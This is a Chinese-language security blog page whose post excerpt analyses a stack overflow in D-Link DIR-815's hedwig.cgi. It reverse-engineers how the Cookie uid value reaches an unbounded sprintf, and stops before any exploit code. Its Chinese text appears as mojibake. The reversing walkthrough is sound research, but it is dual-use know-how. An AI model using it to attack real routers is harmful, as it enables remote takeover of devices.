<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
<meta property="og:type" content="website">
<meta property="og:title" content="ZIKH26&#39;s Blog">
<meta property="og:url" content="https://zikh26.github.io/index.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="CTF PWN IT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zikh26.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZIKH26's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">98</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/d1f081a9.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/d1f081a9.html" class="post-title-link" itemprop="url">D-Link DIR-815è·¯ç”±å™¨æº¢å‡ºæ¼æ´åˆ†æ</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-23 13:07:26" itemprop="dateCreated datePublished" datetime="2023-05-23T13:07:26+08:00">2023-05-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">æ›´æ–°äº</span>
      <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-06-07 09:35:19" itemprop="dateModified" datetime="2023-06-07T09:35:19+08:00">2023-06-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/IOT%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">IOTå®‰å…¨</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>ç½‘ä¸Šå…³äº <code>D-Link DIR-815</code> è·¯ç”±å™¨æ¼æ´å¤ç°çš„æ–‡ç« è¿˜æ˜¯è›®å¤šçš„ï¼Œå› æ­¤ç¬¬ä¸€æ¬¡çš„å¤ç°é€‰æ‹©äº†è¿™ä¸ªè½¯æŸ¿å­ğŸ¤”ã€‚å› ä¸ºç›¸å…³æ–‡ç« å¾ˆå¤šçš„ç¼˜æ•…ï¼Œæ‰€ä»¥æˆ‘å°½å¯èƒ½æ¥å†™ä¸€äº›å¤§å¤šæ–‡ç« æ²¡æœ‰æåˆ°çš„ç‚¹ã€‚</p>
<blockquote>
<p><strong>æ¼æ´æè¿° ï¼šDIR-815 å›ºä»¶ä¸­çš„ Hedwig.cgi è„šæœ¬ä¸­ï¼Œåœ¨å¤„ç† HTTP å¤´æ—¶ï¼Œå¦‚æœ Cookie å­—æ®µä¸­å« uid&#x3D; çš„å€¼åˆ™å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä»è€Œè·å¾—è·¯ç”±å™¨è¿œç¨‹æ§åˆ¶æƒé™</strong></p>
<p><strong>å½±å“ç‰ˆæœ¬ ï¼šDIR-815&#x2F;300&#x2F;600&#x2F;645ç­‰</strong></p>
</blockquote>
<p>é¦–å…ˆä¸‹è½½å›ºä»¶ï¼Œç„¶åç”¨ <code>binwalk</code> è§£å‹å‡ºæ¥å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¾ˆå¤šæ–‡ç« å¯¹è¿™é‡Œè¿›è¡Œäº†è¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ï¼Œåªè®°å½•ä¸€ä¸ªå…³äºè§£å‹åå‡ºç°çš„è½¯é“¾æ¥é—®é¢˜ã€‚æˆ‘çš„ <code>ubuntu 18.04</code> ä¸­ <code>binwalk</code>  è§£å‹æ–‡ä»¶ç³»ç»Ÿæ—¶æŠ¥äº†å¦‚ä¸‹çš„ <code>warning</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241301795.png" alt="image-20230524130155598"></p>
<p>æŸ¥çœ‹ <code>web</code> ç›®å½•ä¸‹çš„æ–‡ä»¶å‘ç°è½¯é“¾æ¥éƒ½æŒ‡å‘äº† <code>/dev/null </code>ï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241304963.png" alt="image-20230524130428836" style="zoom:50%;" />

<p>å¦‚æœå•çº¯çš„ä¸ºäº†å¯åŠ¨ç¨‹åºï¼Œå¯ä»¥å»æ‰‹åŠ¨è®¾ç½®å›åŸæœ¬çš„è½¯é“¾æ¥ï¼ˆä¸Šé¢çš„ <code>warning</code> ä¸­æœ‰è®°å½•åŸæœ¬çš„é“¾æ¥ä½ç½®åœ¨å“ªï¼‰ï¼Œä¸‹æ–‡ä¸­ä¹Ÿæåˆ°äº†è¿™ä¸€ç‚¹ã€‚ä¸è¿‡åœ¨è¯¥æ¼æ´å¤ç°å®Œä¹‹åï¼Œæˆ‘åœ¨ä¸€ç¯‡æ–‡ç« ä¸­å‘ç°äº†è§£å†³çš„æ–¹æ³•ã€‚</p>
<p>å…ˆå»ä¸‹é¢è¿™ä¸ªç›®å½•ï¼Œç„¶åæ‰¾åˆ° <code>extractor.py</code> æ–‡ä»¶ï¼ˆå¦‚æœæ‰¾ä¸åˆ°è¿™ä¸ªç›®å½•çš„è¯ä¹Ÿå¯ä»¥ç”¨ <code>find</code> æœä¸€ä¸‹ <code>extractor.py</code> çš„ä½ç½®ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241311237.png" alt="image-20230524131107143"></p>
<p>ç„¶åæ¥ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ï¼Œç›´æ¥ç¿»åˆ°æ–‡ä»¶çš„æœ€åä¸€è¡Œï¼Œåº”è¯¥æ˜¯ä¸‹é¢è¿™æ ·çš„</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241315177.png" alt="image-20230524131525489" style="zoom:67%;" />

<p>å°±æ”¹æˆ <code>if 0 and not</code> è®©è¿™ä¸ª <code>if</code> è¿›ä¸å»å³å¯ã€‚</p>
<p>æœ€åæ‰§è¡Œå‘½ä»¤ <code>sudo python3 setup.py install</code> é‡æ–°å®‰è£… <code>binwalk</code> å°±èƒ½ç”Ÿæ•ˆäº†ï¼Œå¯ä»¥çœ‹åˆ°ç°åœ¨çš„æ•ˆæœæ˜¯æ­£å¸¸çš„ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241319641.png" alt="image-20230524131948361"></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241320382.png" alt="image-20230524132004859" style="zoom:50%;" />

<p>ä¸è¿‡éœ€è¦æä¸€å¥ï¼Œè¿™é‡Œå³ä½¿çœ‹èµ·æ¥è½¯é“¾æ¥æ˜¯æ­£å¸¸çš„ï¼Œä½†ä¾ç„¶æ— æ³•æ­£å¸¸å¯åŠ¨ç¨‹åºï¼Œå¦‚æœæƒ³è¦è¿è¡ŒæŸä¸ªç¨‹åºçš„è¯ï¼ˆä¾ç„¶éœ€è¦è‡ªå·±æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œè‡³å°‘æˆ‘çš„æ˜¯è¿™æ ·ï¼‰</p>
<h3 id="è¿è¡Œæ—¶æŠ¥é”™"><a href="#è¿è¡Œæ—¶æŠ¥é”™" class="headerlink" title="è¿è¡Œæ—¶æŠ¥é”™"></a>è¿è¡Œæ—¶æŠ¥é”™</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181721376.png" alt="image-20230518172151330"></p>
<p>è¿™ä¸ªæŠ¥é”™è¯´æ˜æ‰¾ä¸åˆ° <code>libgcc_s.so.1</code> æ–‡ä»¶ï¼Œè§£å†³æ–¹æ³•æ˜¯å°†è§£å‹å›ºä»¶å¾—åˆ°çš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„ <code>/lib</code> ç›®å½•ä¸‹çš„ <code>libgcc_s.so.1</code> æ–‡ä»¶è½¯é“¾æ¥åˆ° <code>/lib</code> ç›®å½•ä¸‹å³å¯</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305190951158.png" alt="image-20230519095103004"></p>
<p>ç„¶åå†æ¬¡è¿è¡Œå‘ç°å¹¶ä¸æ˜¯åŸæœ¬ç¼ºå°‘ <code>libgcc_s.so.1</code> çš„æŠ¥é”™äº†ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181658971.png" alt="image-20230518165839841"></p>
<p>çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²ä¼šæ„Ÿè§‰æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œå°† <code>cgibin</code> æ‹–åˆ° <code>ida</code> é‡Œå‘ç°æ˜¯ç¨‹åºé‡Œæ²¡æœ‰åŒ¹é…åˆ°ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå› ä¸ºè¿è¡Œçš„ <code>cgibin</code> ç¨‹åºå¹¶ä¸åœ¨è¿™ä¸ªåŒ¹é…çš„åˆ—è¡¨ä¸­ï¼Œæ­£å¸¸æƒ…å†µä¸‹éƒ½æ˜¯é€šè¿‡è½¯é“¾æ¥æŒ‡å‘çš„è¿™ä¸ªç¨‹åºæ¥æ‰§è¡Œçš„ã€‚æ‰€ä»¥è¦å»æ‰§è¡Œ <code>hedwig.cgi</code> ç¨‹åº</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181659144.png" alt="image-20230518165917093"></p>
<p>å› ä¸ºå½“åˆ <code>binwalk</code> æå–å®Œå›ºä»¶ï¼Œå…¶ä¸­ <code>hedwig.cgi</code> çš„è½¯é“¾æ¥éƒ½æŒ‡å‘äº† <code>/dev/null</code> ï¼Œæ‰€ä»¥è¿™é‡Œè¦æŠŠ <code>hedwig.cgi</code> åˆ æ‰ï¼Œé‡æ–°ç”Ÿæˆä¸€ä¸ª <code>cgibin</code> çš„è½¯é“¾æ¥ã€‚</p>
<p>ä¸‹å›¾ç¨‹åºæ˜¯æˆåŠŸè·‘èµ·æ¥äº†</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181713829.png" alt="image-20230518171306696"></p>
<h3 id="åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶"><a href="#åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶"></a>åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p><code>main</code> å‡½æ•°çš„æœ€å¼€å§‹åœ¨åŒ¹é…ç¨‹åºåä»¥æ¥è°ƒç”¨ä¸åŒçš„å‡½æ•°æ¥å®ç°å…·ä½“åŠŸèƒ½ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305180744182.png" alt="image-20230518074412983" style="zoom:50%;" />

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = *argv;</span><br><span class="line">v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">  v3 = v6 + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="type">void</span> (__noreturn *)())phpcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥è¿™æ®µä»£ç ä¸ºä¾‹ï¼Œé¦–å…ˆæ ¹æ® <code>*argv</code> è·å–ç¨‹åºçš„åå­—ï¼Œé€šè¿‡ <code>strrchr</code> å‡½æ•°æ¥åŒ¹é…ç¨‹åºåä¸­æœ€åä¸€ä¸ª <code>/</code> å‡ºç°çš„ä½ç½®ï¼Œ <code>v6+1</code> å–çš„æ˜¯ <code>/</code> çš„ä¸‹ä¸€ä¸ªå­—ç¬¦çš„åœ°å€ï¼Œç„¶åæ¥åŒ¹é…æ˜¯å¦ä¸º <code>phpcgi</code> è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œ å¦‚æœæ˜¯çš„è¯åˆ™è·³è½¬åˆ° <code>phpcgi_main</code> å‡½æ•°ï¼Œæ•´ä¸ª <code>main</code> å‡½æ•°éƒ½æ˜¯åœ¨åšè¿™ä¸ªäº‹æƒ…</p>
<h4 id="hedwigcgi-main"><a href="#hedwigcgi-main" class="headerlink" title="hedwigcgi_main"></a>hedwigcgi_main</h4><p>æ¥ä¸‹æ¥é€æ­¥åˆ†æ <code>hedwigcgi_main</code> å‡½æ•°</p>
<p><code>sprintf</code> æ˜¯å±é™©å‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²æ ¼å¼åŒ–åæ‹·è´åˆ°æŒ‡å®šå†…å­˜æ—¶æ²¡æœ‰è§„å®šé•¿åº¦å¤§å°ä»è€Œå¯èƒ½å­˜åœ¨æº¢å‡º</p>
<p>è¿™é‡Œéœ€è¦è®©ç¯å¢ƒå˜é‡ <code>REQUEST_METHOD</code> ä¸º <code>POST</code> ï¼Œå¹¶ä¸”åˆ›å»º <code>/var/tmp/temp.xml</code> æ–‡ä»¶</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210851749.png" alt="image-20230521085117376"></p>
<p>ä¸Šå›¾ä¸­å‡ºç°çš„ä¸€ä¸ªå…³é”®å‡½æ•°æ˜¯ <code>sess_get_uid</code> ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†æå–çš„ <code>COOKIE</code> ä¸­ <code>uid=</code> åé¢çš„å­—ç¬¦ä¸²å­˜ä¸º <code>v4</code> çš„ <code>data</code> å­—æ®µã€‚ä¸‹é¢æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°</p>
<h5 id="sess-get-uid"><a href="#sess-get-uid" class="headerlink" title="sess_get_uid"></a>sess_get_uid</h5><p>åœ¨åˆ†æè¿™ä¸ªå‡½æ•°ä¹‹å‰ï¼Œè¿˜éœ€è¦åˆ†æå‰é¢å‡ºç°è¿‡çš„å‡ ä¸ªå‡½æ•° <code>sobj_new</code> <code>sobj_strcmp</code> <code>sobj_add_char</code>  <code>sobj_get_string</code> </p>
<h5 id="sobj-new"><a href="#sobj-new" class="headerlink" title="sobj_new"></a>sobj_new</h5><p>ç”³è¯·äº†ä¸€å—å †ï¼Œç”¨æ¥å­˜å‚¨ç»“æ„ä½“çš„æ•°æ®ï¼Œä¸»è¦å…³æ³¨çš„æ˜¯ <code>max_len</code>  <code>used_len</code> <code>data</code> è¿™ä¸‰ä¸ªæˆå‘˜ï¼Œå…¶ä»–å‡ ä¸ªä¹‹åé€†å‘åˆ†æçš„æ—¶å€™æ²¡ç”¨åˆ°ï¼ˆè¿™é‡Œæ¯ä¸ªå­—æ®µçš„å«ä¹‰ï¼Œä¸æ˜¯ä¸€ä¸Šæ¥å°±çŸ¥é“çš„ï¼Œè¿™æ˜¯åˆ†æå…¶ä»–å‡½æ•°æ—¶è¿›è¡ŒçŒœæµ‹çš„ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181102504.png" alt="image-20230518110253441" style="zoom:50%;" />

<h5 id="sobj-strcmp"><a href="#sobj-strcmp" class="headerlink" title="sobj_strcmp"></a>sobj_strcmp</h5><p>ä¼ å…¥çš„å‚æ•°ä¸€ä¸ªæ˜¯ <code>sobj_new</code> è¿”å›çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œå¦ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œåˆ¤æ–­ç»“æ„ä½“çš„ <code>data</code> å­—æ®µå­˜å‚¨çš„å­—ç¬¦ä¸²æ˜¯å¦å’Œä¼ å…¥çš„å­—ç¬¦ä¸²ä¸€æ ·</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181117507.png" alt="image-20230518111747463" style="zoom:50%;" />

<h5 id="sobj-add-char"><a href="#sobj-add-char" class="headerlink" title="sobj_add_char"></a>sobj_add_char</h5><p>ä¼ å…¥äº† <code>sobj_new</code> è¿”å›çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œå¦ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ã€‚é¦–å…ˆåˆ¤æ–­ç»“æ„ä½“æŒ‡é’ˆæ˜¯å¦å­˜åœ¨ï¼Œ<code>max_len</code> æ˜¯å¦ç­‰äº <code>used_len</code> ã€‚å¦‚æœç¬¦åˆæ¡ä»¶çš„è¯å°†å­—ç¬¦ <code>ch</code> å†™å…¥åˆ° <code>data</code> å­—æ®µä¸­ï¼Œå¹¶ä¸”è®© <code>used_len</code> å­—æ®µåŠ ä¸€ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181126711.png" alt="image-20230518112641661" style="zoom:50%;" />



<h5 id="sobj-get-string"><a href="#sobj-get-string" class="headerlink" title="sobj_get_string"></a>sobj_get_string</h5><p>è¯¥å‡½æ•°ç”¨äºè¿”å›ä¼ å…¥çš„ç»“æ„ä½“æŒ‡é’ˆä¸­ <code>data</code> åŸŸçš„æŒ‡é’ˆ</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181132195.png" alt="image-20230518113206147" style="zoom:50%;" />



<p>ç°åœ¨æ¥åˆ†æ <code>sess_get_uid</code> </p>
<p>å‡½æ•°æœ€å¼€å§‹è¿›è¡Œäº†ä¸€äº›åˆå§‹åŒ–å’Œåˆ¤æ–­ï¼ŒåŒæ—¶æ‹¿åˆ°äº†ç¯å¢ƒå˜é‡ <code>HTTP_COOKIE</code> å€¼çš„æŒ‡é’ˆï¼Œå¹¶è®¾ç½®   <code>state</code> ï¼ˆ çŠ¶æ€ä½ï¼‰ä¸º <code>0</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181110826.png" alt="image-20230518111058786" style="zoom:50%;" />

<p>è¯¥å‡½æ•°å…·ä½“åŠŸèƒ½æ˜¯é€šè¿‡é€ä¸ªæ‰«æ <code>COOKIE</code> çš„å­—ç¬¦ï¼Œæ¥å¯»æ‰¾ <code>=</code> ï¼Œå¦‚æœæ‰¾åˆ°äº† <code>=</code> åˆ™è®¾ç½® <code>state</code> ä¸º <code>2</code> ï¼Œä¹‹åå†æ‰«æå­—ç¬¦çš„æ—¶å€™å› ä¸º <code>state</code> ä¸º <code>2</code> çš„ç¼˜æ•…ï¼Œéƒ½ä¼šè¿›å…¥å¦ä¸€ä¸ªåˆ†æ”¯ï¼Œå»å°†æ‰«æ <code>COOKIE</code> çš„å­—ç¬¦å­˜å‚¨åˆ° <code>v4</code> ç»“æ„ä½“çš„ <code>data</code> æˆå‘˜ä¸­ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ° <code>=</code> é‚£ä¹ˆ <code>state</code> ä¸€ç›´ä¸º <code>1</code> ï¼Œåˆ™å§‹ç»ˆå°† <code>COOKIE</code> çš„å­—ç¬¦å­˜å‚¨åˆ° <code>v2</code> ç»“æ„ä½“çš„ <code>data</code> æˆå‘˜ä¸­ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p>
<p>å½“æ‰«æå®Œ <code>COOKIE</code> çš„æ‰€æœ‰å­—ç¬¦åï¼Œå»åˆ¤æ–­ <code>v2</code> ç»“æ„ä½“çš„ <code>data</code> æˆå‘˜æ˜¯å¦ä¸ºå­—ç¬¦ä¸² <code>uid</code> ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±å°† <code>v4</code> ç»“æ„ä½“ä¹‹å‰å­˜å‚¨çš„å­—ç¬¦ä¸²å†™åˆ°ç»“æ„ä½“ <code>a1</code> çš„ <code>data</code> åŸŸä¸­ã€‚ï¼ˆ <code>a1</code> ä¹Ÿå°±æ˜¯ <code>sess_get_uid</code> å‡½æ•°ä¼ å…¥çš„ç»“æ„ä½“æŒ‡é’ˆï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210943265.png" alt="image-20230521094300133" style="zoom: 67%;" />



<p>å†å›åˆ° <code>hedwigcgi_main</code> å‡½æ•°ä¸Šï¼Œç°åœ¨æƒ³æ‰§è¡Œåˆ°çœŸæ­£åˆ©ç”¨çš„æº¢å‡ºç‚¹ï¼Œéœ€è¦æ§åˆ¶ <code>haystack</code> çš„å€¼æ‰è¡Œï¼ˆå¦‚ä¸‹å›¾ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210954878.png" alt="image-20230521095402701" style="zoom:50%;" /> 



<h4 id="æ§åˆ¶-haystack"><a href="#æ§åˆ¶-haystack" class="headerlink" title="æ§åˆ¶ haystack"></a>æ§åˆ¶ <code>haystack</code></h4><p>é€šè¿‡æŸ¥çœ‹ <code>haystack</code> çš„äº¤å‰å¼•ç”¨ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªåœ°æ–¹å¯ä»¥å¯¹ <code>haystack</code> è¿›è¡Œèµ‹å€¼</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210959344.png" alt="image-20230521095927264" style="zoom:67%;" />



<p>è·³è½¬è¿‡å»åˆ°äº† <code>409A6C</code> å‡½æ•°</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211000998.png" alt="image-20230521100001952" style="zoom:50%;" />

<p>å¦‚æœè®°æ€§ä¸é”™çš„è¯åº”è¯¥èƒ½æƒ³èµ·æ¥å®ƒæ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œåœ¨ <code>hedwigcgi_main</code> å‡½æ•°ä¸­å‡ºç°è¿‡ <code>cgibin_parse_request((int)sub_409A6C, 0, 0x20000u);</code> å› æ­¤å°±è¦å»åˆ†æ <code>cgibin_parse_request</code> å‡½æ•°ï¼Œçœ‹çœ‹æ˜¯ä½•æ—¶è°ƒç”¨äº† <code>409A6C</code> å‡½æ•°</p>
<h5 id="cgibin-parse-request"><a href="#cgibin-parse-request" class="headerlink" title="cgibin_parse_request"></a>cgibin_parse_request</h5><p>è¿™é‡Œæ˜¯ <code>cgibin_parse_request</code> å‡½æ•°çš„åéƒ¨åˆ†ï¼Œå‰éƒ¨åˆ†è¦æ»¡è¶³ <code>CONTENT_LENGTH &lt; 0x20000</code> å’Œ <code>REQUEST_URI</code> è¿™ä¸ªå€¼è¦å­˜åœ¨ï¼Œè¿™æ ·æ‰èƒ½èµ°åˆ°ä¸‹é¢è¿™éƒ¨åˆ†</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211014282.png" alt="image-20230521101434200" style="zoom: 67%;" />

<p>è¿™é‡Œè®¾ç½® <code>CONTENT_TYPE</code> ä¸º <code>aApplication</code> ï¼Œæœ€åä¼šè°ƒç”¨ <code>0x42C014[2]</code> ä½ç½®çš„æŒ‡é’ˆï¼Œè¯¥å‡½æ•°æŒ‡é’ˆå°±æ˜¯ <code>0x403B10</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211050021.png" alt="image-20230521105041949"></p>
<p>ä¹‹åç»™ä¸ªåˆ†æçš„æ€è·¯å§ï¼Œ å®åœ¨ä¸æƒ³å†™è¿™ä¹ˆè¯¦ç»†äº†ã€‚</p>
